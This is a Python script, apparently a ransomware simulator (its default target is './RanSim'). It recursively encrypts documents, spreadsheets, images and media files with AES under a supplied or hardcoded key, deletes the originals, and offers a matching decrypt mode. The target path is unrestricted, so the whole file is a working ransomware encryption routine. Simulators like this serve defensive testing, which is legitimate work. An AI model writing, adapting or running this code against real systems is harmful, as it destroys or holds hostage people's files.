import os
import glob
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

# AES encryption and decryption functions
def encrypt_file(file_path, key, extension=".encrypted"):
    try:
        # Open the file and read the data
        with open(file_path, 'rb') as f:
            data = f.read()

        # Pad the data to ensure it is a multiple of the block size (16 bytes)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt the data using AES
        iv = os.urandom(16)  # Initialization vector
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Write the IV and encrypted data to a new file with the extension
        with open(file_path + extension, 'wb') as f:
            f.write(iv + encrypted_data)

        # Optionally remove the original file
        os.remove(file_path)
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {str(e)}")

def decrypt_file(file_path, key, extension=".encrypted"):
    try:
        # Open the encrypted file and read the data
        with open(file_path, 'rb') as f:
            iv = f.read(16)  # Read the initialization vector
            encrypted_data = f.read()

        # Decrypt the data using AES
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Unpad the decrypted data
        unpadder = padding.PKCS7(128).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()

        # Write the decrypted data to a new file without the extension
        original_file_path = file_path.replace(extension, '')
        with open(original_file_path, 'wb') as f:
            f.write(data)

        # Optionally remove the encrypted file
        os.remove(file_path)
        print(f"Decrypted {file_path}")
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {str(e)}")

# Function to recursively process files
def process_files(mode, target_path, extension, key):
    # List of target file types
    target_files = ['*.pdf', '*.xls*', '*.ppt*', '*.doc*', '*.accd*', '*.rtf', '*.txt', '*.csv', '*.jpg', '*.jpeg', '*.png', '*.gif', '*.avi', '*.midi', '*.mov', '*.mp3', '*.mp4', '*.mpeg', '*.mpg', '*.ogg']

    # Loop through all the target file types
    for target_file in target_files:
        # Search for files recursively in the target directory
        files = glob.glob(os.path.join(target_path, '**', target_file), recursive=True)

        for file_path in files:
            try:
                if mode == 'encrypt':
                    # Skip files that are already encrypted
                    if not file_path.endswith(extension):
                        encrypt_file(file_path, key, extension)
                elif mode == 'decrypt':
                    # Only decrypt files with the specified extension
                    if file_path.endswith(extension):
                        decrypt_file(file_path, key, extension)
                else:
                    print("Invalid mode. Choose 'encrypt' or 'decrypt'.")
            except Exception as e:
                print(f"Error processing {file_path}: {str(e)}")

# Ensure proper base64 padding
def correct_base64_padding(b64_string):
    """ Add padding to the base64 string if necessary. """
    missing_padding = len(b64_string) % 4
    if missing_padding:
        b64_string += '=' * (4 - missing_padding)
    return b64_string

if __name__ == '__main__':
    # User inputs (you can modify these as needed)
    mode = input("Enter mode (encrypt/decrypt): ").strip().lower()
    target_path = input("Enter target path (default is './RanSim'): ").strip() or './RanSim'
    extension = input("Enter file extension for encryption (default is '.encrypted'): ").strip() or '.encrypted'
    key = input("Enter AES key (base64 encoded): ").strip() or "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="

    # Fix padding and decode the base64 key
    key = correct_base64_padding(key)
    key = base64.b64decode(key)

    # Ensure the target path exists
    if not os.path.exists(target_path):
        print(f"Error: The target path {target_path} does not exist.")
    else:
        process_files(mode, target_path, extension, key)
